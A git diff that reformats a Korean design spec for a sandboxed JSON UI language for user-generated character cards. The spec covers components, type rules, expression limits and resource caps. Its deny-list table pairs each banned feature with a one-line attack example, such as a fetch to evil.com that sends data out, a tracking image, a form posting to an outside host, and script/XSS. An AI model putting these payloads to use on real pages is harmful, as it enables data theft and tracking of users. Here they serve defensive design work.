@@ -10,10 +10,10 @@
 
 ## 변경 이력
 
-| 버전 | 날짜 | 변경 내용 |
-|------|------|-----------|
-| v0.1 | 2026-01-30 | 초기 스펙 |
-| v0.2 | 2026-01-30 | gradient 구조화, 표현식 강화, CSS 제한 추가, 레이어 격리 명시 |
+| 버전 | 날짜       | 변경 내용                                                              |
+| ---- | ---------- | ---------------------------------------------------------------------- |
+| v0.1 | 2026-01-30 | 초기 스펙                                                              |
+| v0.2 | 2026-01-30 | gradient 구조화, 표현식 강화, CSS 제한 추가, 레이어 격리 명시          |
 | v0.3 | 2026-01-30 | position 규칙 통합, 값 타입 시스템 명시, 전체 크기 제한, overflow 제한 |
 
 ---
@@ -22,36 +22,36 @@
 
 ### 1.1 절대 금지 (협상 불가)
 
-| 항목 | 이유 | 공격 예시 |
-|------|------|-----------|
-| 외부 네트워크 요청 | 데이터 유출 | `fetch("https://evil.com/?data=...")` |
-| 외부 리소스 로드 | 트래킹, 데이터 유출 | `<img src="https://evil.com/track.gif">` |
-| url() 함수 | CSS 통한 외부 요청 | `background: url("https://evil.com")` |
-| 이벤트 핸들러 | 임의 코드 실행 | `onclick="stealData()"` |
-| script 태그 | 임의 코드 실행 | `<script>alert('xss')</script>` |
-| 민감한 입력 필드 | 피싱 | `<input type="password">` |
-| form 태그 | 데이터 외부 전송 | `<form action="https://evil.com">` |
-| iframe | 샌드박스 탈출 | `<iframe src="...">` |
-| 임의 JavaScript | 모든 공격 가능 | `eval()`, `Function()` |
-| 무한 루프 | DoS | `while(true) {}` |
-| 과도한 재귀 | 스택 오버플로우 | 깊은 재귀 호출 |
+| 항목               | 이유                | 공격 예시                                |
+| ------------------ | ------------------- | ---------------------------------------- |
+| 외부 네트워크 요청 | 데이터 유출         | `fetch("https://evil.com/?data=...")`    |
+| 외부 리소스 로드   | 트래킹, 데이터 유출 | `<img src="https://evil.com/track.gif">` |
+| url() 함수         | CSS 통한 외부 요청  | `background: url("https://evil.com")`    |
+| 이벤트 핸들러      | 임의 코드 실행      | `onclick="stealData()"`                  |
+| script 태그        | 임의 코드 실행      | `<script>alert('xss')</script>`          |
+| 민감한 입력 필드   | 피싱                | `<input type="password">`                |
+| form 태그          | 데이터 외부 전송    | `<form action="https://evil.com">`       |
+| iframe             | 샌드박스 탈출       | `<iframe src="...">`                     |
+| 임의 JavaScript    | 모든 공격 가능      | `eval()`, `Function()`                   |
+| 무한 루프          | DoS                 | `while(true) {}`                         |
+| 과도한 재귀        | 스택 오버플로우     | 깊은 재귀 호출                           |
 
 ### 1.2 허용
 
-| 항목 | 조건 |
-|------|------|
-| 로컬 에셋 참조 | `@assets/` 경로만 |
-| 색상 | HEX, RGB, HSL, 색상명 |
-| 그라데이션 | 구조화된 형식만 (섹션 3.4 참조) |
-| 레이아웃 스타일 | padding, margin, gap 등 |
-| 크기 | px, %, em, rem, auto |
-| 테두리/모서리 | border, borderRadius |
-| 그림자 | 구조화된 형식만 (섹션 3.5 참조) |
-| 투명도 | opacity |
-| 상태 바인딩 | `$변수명` (읽기 전용) |
-| 조건부 렌더링 | `if/then/else` |
-| 반복 렌더링 | `for...in` (횟수 제한) |
-| 기본 연산 | 사칙연산, 비교, 논리 연산 |
+| 항목            | 조건                            |
+| --------------- | ------------------------------- |
+| 로컬 에셋 참조  | `@assets/` 경로만               |
+| 색상            | HEX, RGB, HSL, 색상명           |
+| 그라데이션      | 구조화된 형식만 (섹션 3.4 참조) |
+| 레이아웃 스타일 | padding, margin, gap 등         |
+| 크기            | px, %, em, rem, auto            |
+| 테두리/모서리   | border, borderRadius            |
+| 그림자          | 구조화된 형식만 (섹션 3.5 참조) |
+| 투명도          | opacity                         |
+| 상태 바인딩     | `$변수명` (읽기 전용)           |
+| 조건부 렌더링   | `if/then/else`                  |
+| 반복 렌더링     | `for...in` (횟수 제한)          |
+| 기본 연산       | 사칙연산, 비교, 논리 연산       |
 
 ### 1.3 레이어 격리
 
@@ -74,6 +74,7 @@
 ```
 
 **구현 요구사항:**
+
 - UGC 컨테이너에 `overflow: hidden` 강제
 - UGC 내부 `zIndex`는 0-100 범위로 제한
 - `transform: scale()`은 1.5 이하로 제한
@@ -84,6 +85,7 @@
 다음은 Safe UGC UI 스펙의 **기술적 범위 밖**이지만, 플랫폼이 별도로 대응해야 함:
 
 **사회공학 공격:**
+
 ```
 캐릭터: "게임하자! 진짜 전화번호 알려줘~"
 유저: "010-1234-5678" (자발적 입력)
@@ -92,6 +94,7 @@
 이는 입력 필드 없이도 발생 가능하며, 기술로 100% 차단 불가.
 
 **플랫폼 레벨 권장 대응:**
+
 - 채팅 내 민감정보 패턴 감지 시 경고 표시
 - 신고/차단/리포트 UX 제공
 - 카드 업로드 시 가이드라인 동의
@@ -103,39 +106,39 @@
 
 ### 2.1 레이아웃
 
-| 컴포넌트 | 설명 | position 허용 |
-|----------|------|---------------|
-| Box | 범용 컨테이너 | static, relative |
-| Row | 가로 배치 (flexbox row) | static, relative |
-| Column | 세로 배치 (flexbox column) | static, relative |
-| Stack | 겹치기 컨테이너 | 자식에게 absolute 허용 |
-| Grid | 그리드 레이아웃 | static, relative |
-| Spacer | 빈 공간 | static |
+| 컴포넌트 | 설명                       | position 허용          |
+| -------- | -------------------------- | ---------------------- |
+| Box      | 범용 컨테이너              | static, relative       |
+| Row      | 가로 배치 (flexbox row)    | static, relative       |
+| Column   | 세로 배치 (flexbox column) | static, relative       |
+| Stack    | 겹치기 컨테이너            | 자식에게 absolute 허용 |
+| Grid     | 그리드 레이아웃            | static, relative       |
+| Spacer   | 빈 공간                    | static                 |
 
 ### 2.2 콘텐츠
 
-| 컴포넌트 | 설명 |
-|----------|------|
-| Text | 텍스트 표시 |
-| Image | 이미지 (로컬 에셋만) |
-| Icon | 아이콘 (플랫폼 제공 세트) |
-| Divider | 구분선 |
+| 컴포넌트 | 설명                      |
+| -------- | ------------------------- |
+| Text     | 텍스트 표시               |
+| Image    | 이미지 (로컬 에셋만)      |
+| Icon     | 아이콘 (플랫폼 제공 세트) |
+| Divider  | 구분선                    |
 
 ### 2.3 표시 컴포넌트
 
-| 컴포넌트 | 설명 |
-|----------|------|
+| 컴포넌트    | 설명                 |
+| ----------- | -------------------- |
 | ProgressBar | 게이지/프로그레스 바 |
-| Badge | 태그/뱃지 |
-| Avatar | 프로필 이미지 (원형) |
-| Chip | 작은 태그 |
+| Badge       | 태그/뱃지            |
+| Avatar      | 프로필 이미지 (원형) |
+| Chip        | 작은 태그            |
 
 ### 2.4 (선택) 제한된 인터랙션
 
-| 컴포넌트 | 설명 | 조건 |
-|----------|------|------|
-| Button | 버튼 | 플랫폼 정의 액션만 |
-| Toggle | 토글 | 로컬 상태 변경만 |
+| 컴포넌트 | 설명 | 조건               |
+| -------- | ---- | ------------------ |
+| Button   | 버튼 | 플랫폼 정의 액션만 |
+| Toggle   | 토글 | 로컬 상태 변경만   |
 
 ---
 
@@ -177,6 +180,7 @@ overflow: [visible, hidden, auto]
 ```
 
 **추가 제한:**
+
 - `overflow: auto` 사용 가능 컴포넌트: **카드당 최대 2개**
 - 중첩된 `overflow: auto`는 금지 (부모가 auto면 자식은 불가)
 
@@ -184,13 +188,13 @@ overflow: [visible, hidden, auto]
 
 **이 섹션이 position에 대한 유일한 규칙입니다.**
 
-| position 값 | 허용 여부 | 조건 |
-|-------------|-----------|------|
-| `static` | ✅ 허용 | 항상 |
-| `relative` | ✅ 허용 | 항상 |
-| `absolute` | ⚠️ 조건부 | Stack 컴포넌트의 직접 자식에서만 |
-| `fixed` | ❌ 금지 | 항상 |
-| `sticky` | ❌ 금지 | 항상 |
+| position 값 | 허용 여부 | 조건                             |
+| ----------- | --------- | -------------------------------- |
+| `static`    | ✅ 허용   | 항상                             |
+| `relative`  | ✅ 허용   | 항상                             |
+| `absolute`  | ⚠️ 조건부 | Stack 컴포넌트의 직접 자식에서만 |
+| `fixed`     | ❌ 금지   | 항상                             |
+| `sticky`    | ❌ 금지   | 항상                             |
 
 **absolute 허용 조건 상세:**
 
@@ -216,6 +220,7 @@ overflow: [visible, hidden, auto]
 - absolute 요소는 Stack 경계 밖으로 렌더링 불가 (Stack에 `overflow: hidden` 강제)
 
 **z-index 규칙:**
+
 - 허용 범위: 0-100
 - 기본값: 0
 - Stack 내부에서만 의미 있음
@@ -238,10 +243,12 @@ overflow: [visible, hidden, auto]
 ```
 
 **허용되는 그라데이션 타입:**
+
 - `linear`: 선형 그라데이션
 - `radial`: 원형 그라데이션 (선택적 지원)
 
 **금지:**
+
 - `url()` 포함 불가
 - `var()` 포함 불가
 - 문자열로 직접 작성 불가
@@ -261,6 +268,7 @@ overflow: [visible, hidden, auto]
 ```
 
 **다중 그림자 (배열):**
+
 ```json
 {
   "boxShadow": [
@@ -271,6 +279,7 @@ overflow: [visible, hidden, auto]
 ```
 
 **제한:**
+
 - 그림자 최대 개수: 5개
 - blur 최대값: 100px
 - spread 최대값: 50px
@@ -290,40 +299,40 @@ overflow: [visible, hidden, auto]
 
 **제한:**
 
-| 속성 | 허용 범위 | 이유 |
-|------|-----------|------|
-| scale | 0.1 ~ 1.5 | UI 덮기 방지 |
-| rotate | -360deg ~ 360deg | 자유 |
-| translateX/Y | -500px ~ 500px | 컨테이너 탈출 방지 |
-| skew | ❌ 금지 | 피싱 UI 방지 |
+| 속성         | 허용 범위        | 이유               |
+| ------------ | ---------------- | ------------------ |
+| scale        | 0.1 ~ 1.5        | UI 덮기 방지       |
+| rotate       | -360deg ~ 360deg | 자유               |
+| translateX/Y | -500px ~ 500px   | 컨테이너 탈출 방지 |
+| skew         | ❌ 금지          | 피싱 UI 방지       |
 
 ### 3.7 시각적 속성
 
 ```yaml
 # 배경
 backgroundColor: <color>
-backgroundGradient: <GradientObject>  # 섹션 3.4 참조
+backgroundGradient: <GradientObject> # 섹션 3.4 참조
 
 # 테두리
-border: <BorderObject>  # { width, style, color }
-borderRadius: <length>  # 최대 9999px
+border: <BorderObject> # { width, style, color }
+borderRadius: <length> # 최대 9999px
 borderTop/Right/Bottom/Left: <BorderObject>
 
 # 그림자
-boxShadow: <ShadowObject> | <ShadowObject[]>  # 섹션 3.5 참조
+boxShadow: <ShadowObject> | <ShadowObject[]> # 섹션 3.5 참조
 
 # 텍스트
 color: <color>
-fontSize: <length>  # 8px ~ 72px
+fontSize: <length> # 8px ~ 72px
 fontWeight: [normal, bold, 100-900]
 fontStyle: [normal, italic]
 textAlign: [left, center, right, justify]
 textDecoration: [none, underline, line-through]
 lineHeight: <number> | <length>
-letterSpacing: <length>  # -10px ~ 50px
+letterSpacing: <length> # -10px ~ 50px
 
 # 기타
-opacity: <number>  # 0 ~ 1
+opacity: <number> # 0 ~ 1
 ```
 
 ### 3.8 금지 속성
@@ -358,12 +367,12 @@ mask: ❌
 ### 4.1 기본 타입
 
 ```typescript
-type Literal<T> = T;                           // 직접 값
-type Ref = { $ref: string };                   // 상태 참조
-type Expr = { $expr: string };                 // 표현식
-type Dynamic<T> = T | Ref | Expr;              // 동적 값 (셋 다 가능)
-type RefOnly<T> = T | Ref;                     // 참조만 (표현식 금지)
-type Static<T> = T;                            // 정적만 (동적 금지)
+type Literal<T> = T; // 직접 값
+type Ref = { $ref: string }; // 상태 참조
+type Expr = { $expr: string }; // 표현식
+type Dynamic<T> = T | Ref | Expr; // 동적 값 (셋 다 가능)
+type RefOnly<T> = T | Ref; // 참조만 (표현식 금지)
+type Static<T> = T; // 정적만 (동적 금지)
 ```
 
 ### 4.2 컴포넌트별 Props 타입
@@ -373,16 +382,16 @@ type Static<T> = T;                            // 정적만 (동적 금지)
 ```typescript
 // Image - src는 참조만 허용 (표현식으로 URL 조작 방지)
 interface ImageProps {
-  src: Static<AssetPath> | Ref;    // ✅ "@assets/img.png" 또는 { $ref: "$imgPath" }
-                                   // ❌ { $expr: "..." } 금지
-  alt?: Dynamic<string>;           // 표현식 허용
+  src: Static<AssetPath> | Ref; // ✅ "@assets/img.png" 또는 { $ref: "$imgPath" }
+  // ❌ { $expr: "..." } 금지
+  alt?: Dynamic<string>; // 표현식 허용
   width?: Dynamic<Length>;
   height?: Dynamic<Length>;
 }
 
 // Text - content는 모두 허용
 interface TextProps {
-  content: Dynamic<string>;        // 모두 허용
+  content: Dynamic<string>; // 모두 허용
 }
 
 // ProgressBar - value/max는 모두 허용
@@ -394,13 +403,13 @@ interface ProgressBarProps {
 
 // Avatar - src는 Image와 동일하게 제한
 interface AvatarProps {
-  src: Static<AssetPath> | Ref;    // 표현식 금지
+  src: Static<AssetPath> | Ref; // 표현식 금지
   size?: Dynamic<Length>;
 }
 
 // Icon - name은 정적만
 interface IconProps {
-  name: Static<IconName>;          // 플랫폼 정의 아이콘만
+  name: Static<IconName>; // 플랫폼 정의 아이콘만
   size?: Dynamic<Length>;
   color?: Dynamic<Color>;
 }
@@ -423,24 +432,24 @@ interface StyleProps {
   margin?: Dynamic<Length>;
   gap?: Dynamic<Length>;
   flex?: Dynamic<number>;
-  
+
   // 색상 - 모두 동적 허용
   backgroundColor?: Dynamic<Color>;
   color?: Dynamic<Color>;
-  
+
   // 구조화된 객체 - 정적만 (복잡도 제한)
   backgroundGradient?: Static<GradientObject>;
   boxShadow?: Static<ShadowObject | ShadowObject[]>;
   border?: Static<BorderObject>;
   transform?: Static<TransformObject>;
-  
+
   // position - 정적만 (보안)
   position?: Static<'static' | 'relative' | 'absolute'>;
   top?: Static<Length>;
   right?: Static<Length>;
   bottom?: Static<Length>;
   left?: Static<Length>;
-  zIndex?: Static<number>;  // 0-100
+  zIndex?: Static<number>; // 0-100
 }
 ```
 
@@ -451,29 +460,29 @@ interface StyleProps {
 type AssetPath = `@assets/${string}`;
 
 // 유효한 예
-"@assets/character.png"
-"@assets/icons/heart.svg"
-"@assets/sounds/click.mp3"
+('@assets/character.png');
+('@assets/icons/heart.svg');
+('@assets/sounds/click.mp3');
 
 // 무효한 예
-"https://example.com/image.png"  // ❌ 외부 URL
-"/images/photo.jpg"              // ❌ 절대 경로
-"../other/file.png"              // ❌ 상대 경로
+('https://example.com/image.png'); // ❌ 외부 URL
+('/images/photo.jpg'); // ❌ 절대 경로
+('../other/file.png'); // ❌ 상대 경로
 ```
 
 ### 4.5 검증 규칙 요약
 
-| 속성 유형 | Literal | $ref | $expr |
-|-----------|---------|------|-------|
-| Image.src | ✅ | ✅ | ❌ |
-| Avatar.src | ✅ | ✅ | ❌ |
-| Icon.name | ✅ | ❌ | ❌ |
-| Text.content | ✅ | ✅ | ✅ |
-| 색상 속성 | ✅ | ✅ | ✅ |
-| 크기 속성 | ✅ | ✅ | ✅ |
-| position | ✅ | ❌ | ❌ |
-| transform | ✅ | ❌ | ❌ |
-| gradient | ✅ | ❌ | ❌ |
+| 속성 유형    | Literal | $ref | $expr |
+| ------------ | ------- | ---- | ----- |
+| Image.src    | ✅      | ✅   | ❌    |
+| Avatar.src   | ✅      | ✅   | ❌    |
+| Icon.name    | ✅      | ❌   | ❌    |
+| Text.content | ✅      | ✅   | ✅    |
+| 색상 속성    | ✅      | ✅   | ✅    |
+| 크기 속성    | ✅      | ✅   | ✅    |
+| position     | ✅      | ❌   | ❌    |
+| transform    | ✅      | ❌   | ❌    |
+| gradient     | ✅      | ❌   | ❌    |
 
 ---
 
@@ -481,12 +490,12 @@ type AssetPath = `@assets/${string}`;
 
 ### 5.1 제한 수치
 
-| 제한 | 값 | 이유 |
-|------|-----|------|
-| 표현식 문자열 길이 | 최대 500자 | 파싱 DoS 방지 |
-| 토큰 수 | 최대 50개 | 복잡도 제한 |
-| 중첩 깊이 | 최대 10단계 | 스택 보호 |
-| 문자열 리터럴 길이 | 최대 1000자 | 메모리 보호 |
+| 제한               | 값          | 이유          |
+| ------------------ | ----------- | ------------- |
+| 표현식 문자열 길이 | 최대 500자  | 파싱 DoS 방지 |
+| 토큰 수            | 최대 50개   | 복잡도 제한   |
+| 중첩 깊이          | 최대 10단계 | 스택 보호     |
+| 문자열 리터럴 길이 | 최대 1000자 | 메모리 보호   |
 
 ### 5.2 변수 참조
 
@@ -559,6 +568,7 @@ if $hp < 20 then "위험" else "정상"
 ```
 
 **제한:**
+
 - 중첩 최대 3단계
 - else 필수
 
@@ -582,6 +592,7 @@ for msg in $messages { ... }
 ```
 
 **제한:**
+
 - 최대 반복 횟수: 1000회
 - 중첩 반복 최대: 2단계
 
@@ -604,14 +615,14 @@ typeof, instanceof, new, delete
 ### 5.10 에러 처리
 
 ```yaml
-타입 불일치:        에러 표시 + 기본값
-0으로 나눔:         에러 표시 + 기본값
-존재하지 않는 변수:  에러 표시 + 기본값
-범위 초과:          에러 표시 + 기본값
+타입 불일치: 에러 표시 + 기본값
+0으로 나눔: 에러 표시 + 기본값
+존재하지 않는 변수: 에러 표시 + 기본값
+범위 초과: 에러 표시 + 기본값
 
 # 기본값 정책
 숫자 컨텍스트: 0
-문자열 컨텍스트: ""
+문자열 컨텍스트: ''
 불리언 컨텍스트: false
 ```
 
@@ -621,47 +632,47 @@ typeof, instanceof, new, delete
 
 ### 6.1 카드 전체 제한
 
-| 리소스 | 제한 | 이유 |
-|--------|------|------|
-| **카드 JSON 전체 크기** | **최대 1MB** | 파싱 DoS 방지 |
-| **Text content 총합** | **최대 200KB** | 메모리 보호 |
-| **style 객체 총 크기** | **최대 100KB** | 복잡도 제한 |
-| 에셋 개별 크기 | 최대 5MB | 대역폭 |
-| 에셋 총합 | 최대 50MB | 저장소 |
+| 리소스                  | 제한           | 이유          |
+| ----------------------- | -------------- | ------------- |
+| **카드 JSON 전체 크기** | **최대 1MB**   | 파싱 DoS 방지 |
+| **Text content 총합**   | **최대 200KB** | 메모리 보호   |
+| **style 객체 총 크기**  | **최대 100KB** | 복잡도 제한   |
+| 에셋 개별 크기          | 최대 5MB       | 대역폭        |
+| 에셋 총합               | 최대 50MB      | 저장소        |
 
 ### 6.2 렌더링 제한
 
-| 리소스 | 제한 | 이유 |
-|--------|------|------|
-| 렌더링 노드 수 | 최대 10000개 | 메모리/성능 |
-| 반복 횟수 | 최대 1000회 | DoS 방지 |
-| 중첩 반복 | 최대 2단계 | 복잡도 |
+| 리소스                  | 제한         | 이유           |
+| ----------------------- | ------------ | -------------- |
+| 렌더링 노드 수          | 최대 10000개 | 메모리/성능    |
+| 반복 횟수               | 최대 1000회  | DoS 방지       |
+| 중첩 반복               | 최대 2단계   | 복잡도         |
 | **overflow: auto 개수** | **최대 2개** | UX/스크롤 재킹 |
-| Stack 중첩 | 최대 3단계 | 복잡도 |
+| Stack 중첩              | 최대 3단계   | 복잡도         |
 
 ### 6.3 표현식 제한
 
-| 리소스 | 제한 | 이유 |
-|--------|------|------|
-| 표현식 길이 | 최대 500자 | 파싱 DoS |
-| 토큰 수 | 최대 50개 | 복잡도 |
-| 중첩 깊이 | 최대 10단계 | 스택 보호 |
-| 조건문 중첩 | 최대 3단계 | 가독성 |
-| 문자열 리터럴 | 최대 1000자 | 메모리 |
-| 변수 참조 깊이 | 최대 5단계 | 복잡도 |
-| 배열 인덱스 | 최대 9999 | 범위 |
+| 리소스         | 제한        | 이유      |
+| -------------- | ----------- | --------- |
+| 표현식 길이    | 최대 500자  | 파싱 DoS  |
+| 토큰 수        | 최대 50개   | 복잡도    |
+| 중첩 깊이      | 최대 10단계 | 스택 보호 |
+| 조건문 중첩    | 최대 3단계  | 가독성    |
+| 문자열 리터럴  | 최대 1000자 | 메모리    |
+| 변수 참조 깊이 | 최대 5단계  | 복잡도    |
+| 배열 인덱스    | 최대 9999   | 범위      |
 
 ### 6.4 스타일 제한
 
-| 리소스 | 제한 | 이유 |
-|--------|------|------|
-| z-index | 0-100 | 레이어 격리 |
-| transform scale | 0.1-1.5 | UI 덮기 방지 |
-| transform translate | -500px ~ 500px | 탈출 방지 |
-| fontSize | 8-72px | 가독성 |
-| boxShadow 개수 | 최대 5개 | 성능 |
-| boxShadow blur | 최대 100px | 성능 |
-| borderRadius | 최대 9999px | 합리적 범위 |
+| 리소스              | 제한           | 이유         |
+| ------------------- | -------------- | ------------ |
+| z-index             | 0-100          | 레이어 격리  |
+| transform scale     | 0.1-1.5        | UI 덮기 방지 |
+| transform translate | -500px ~ 500px | 탈출 방지    |
+| fontSize            | 8-72px         | 가독성       |
+| boxShadow 개수      | 최대 5개       | 성능         |
+| boxShadow blur      | 최대 100px     | 성능         |
+| borderRadius        | 최대 9999px    | 합리적 범위  |
 
 ---
 
@@ -706,9 +717,9 @@ typeof, instanceof, new, delete
             {
               "type": "Avatar",
               "condition": { "$expr": "not $msg.mine" },
-              "props": { 
+              "props": {
                 "src": "@assets/profile.png",
-                "size": 36 
+                "size": 36
               }
             },
             {
@@ -981,24 +992,49 @@ typeof, instanceof, new, delete
                       "type": "Row",
                       "style": { "gap": 8, "alignItems": "center" },
                       "children": [
-                        { "type": "Icon", "props": { "name": "comment", "size": 18, "color": "#666666" } },
-                        { "type": "Text", "props": { "content": { "$ref": "$replies" } }, "style": { "color": "#666666", "fontSize": 13 } }
+                        {
+                          "type": "Icon",
+                          "props": { "name": "comment", "size": 18, "color": "#666666" }
+                        },
+                        {
+                          "type": "Text",
+                          "props": { "content": { "$ref": "$replies" } },
+                          "style": { "color": "#666666", "fontSize": 13 }
+                        }
                       ]
                     },
                     {
                       "type": "Row",
                       "style": { "gap": 8, "alignItems": "center" },
                       "children": [
-                        { "type": "Icon", "props": { "name": "retweet", "size": 18, "color": "#666666" } },
-                        { "type": "Text", "props": { "content": { "$ref": "$retweets" } }, "style": { "color": "#666666", "fontSize": 13 } }
+                        {
+                          "type": "Icon",
+                          "props": { "name": "retweet", "size": 18, "color": "#666666" }
+                        },
+                        {
+                          "type": "Text",
+                          "props": { "content": { "$ref": "$retweets" } },
+                          "style": { "color": "#666666", "fontSize": 13 }
+                        }
                       ]
                     },
                     {
                       "type": "Row",
                       "style": { "gap": 8, "alignItems": "center" },
                       "children": [
-                        { "type": "Icon", "props": { "name": "heart", "size": 18, "color": { "$expr": "if $liked then '#e0245e' else '#666666'" } } },
-                        { "type": "Text", "props": { "content": { "$ref": "$likes" } }, "style": { "color": "#666666", "fontSize": 13 } }
+                        {
+                          "type": "Icon",
+                          "props": {
+                            "name": "heart",
+                            "size": 18,
+                            "color": { "$expr": "if $liked then '#e0245e' else '#666666'" }
+                          }
+                        },
+                        {
+                          "type": "Text",
+                          "props": { "content": { "$ref": "$likes" } },
+                          "style": { "color": "#666666", "fontSize": 13 }
+                        }
                       ]
                     }
                   ]
@@ -1110,6 +1146,7 @@ typeof, instanceof, new, delete
 ## 9. 구현 로드맵
 
 ### Phase 1: MVP (2-4주)
+
 - [ ] TypeScript 타입 정의 (섹션 4 기반)
 - [ ] JSON 스키마 생성
 - [ ] 값 타입 검증기 ($ref, $expr 제한)
@@ -1118,6 +1155,7 @@ typeof, instanceof, new, delete
 - [ ] 레이어 격리 컨테이너
 
 ### Phase 2: 완성도 (4-6주)
+
 - [ ] 나머지 프리미티브 (ProgressBar, Avatar, Badge, Icon, Stack)
 - [ ] 표현식 파서/평가기
 - [ ] 반복 렌더링 (for...in)
@@ -1126,12 +1164,14 @@ typeof, instanceof, new, delete
 - [ ] 에러 메시지
 
 ### Phase 3: 통합 (2-4주)
+
 - [ ] RebelAI 통합
 - [ ] CharX → Safe UI 변환 도구
 - [ ] 카드 미리보기
 - [ ] 문서화
 
 ### Phase 4: (선택) 문법 설탕
+
 - [ ] CharLang 텍스트 문법
 - [ ] CharLang → JSON 컴파일러
 - [ ] 에디터 지원
@@ -1177,6 +1217,7 @@ typeof, instanceof, new, delete
 ## 11. 열린 질문들
 
 ### 결정 필요
+
 - [ ] 애니메이션/트랜지션: 제한적 허용?
 - [ ] 사운드: 로컬 에셋으로 허용?
 - [ ] 커스텀 폰트: 로컬 에셋으로 허용?
@@ -1184,6 +1225,7 @@ typeof, instanceof, new, delete
 - [ ] Button/Toggle 포함?
 
 ### 향후 검토
+
 - [ ] 웹 접근성 (a11y)
 - [ ] 다크모드
 - [ ] 국제화 (RTL)
@@ -1191,5 +1233,5 @@ typeof, instanceof, new, delete
 
 ---
 
-*문서 버전: 0.3*
-*최종 수정: 2026-01-30*
+_문서 버전: 0.3_
+_최종 수정: 2026-01-30_
